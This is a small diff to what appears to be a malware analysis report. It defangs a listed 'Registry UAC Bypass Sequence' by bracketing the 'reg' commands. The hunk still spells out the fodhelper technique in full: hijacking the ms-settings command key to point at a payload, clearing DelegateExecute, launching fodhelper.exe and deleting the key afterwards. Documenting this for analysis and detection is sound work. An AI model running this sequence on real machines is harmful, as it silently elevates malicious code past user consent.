@@ -1357,17 +1357,17 @@ for each process {
 #### Technique 3 - Registry UAC Bypass Sequence
 ```c
 // Registry modification commands (via cmd.exe invocation)
-reg add HKCU\Software\Classes\ms-settings\Shell\Open\command
+[r]eg add HKCU\Software\Classes\ms-settings\Shell\Open\command
     /d "C:\path\to\payload.exe" /f;
 
-reg add HKCU\Software\Classes\ms-settings\Shell\Open\command
+[r]eg add HKCU\Software\Classes\ms-settings\Shell\Open\command
     /v DelegateExecute /t REG_SZ /f;
 
 // Execute through fodhelper
 start fodhelper.exe;
 
 // Cleanup
-reg delete HKCU\Software\Classes\ms-settings /f;
+[r]eg delete HKCU\Software\Classes\ms-settings /f;
 ```
 
 ### String and Resource Analysis
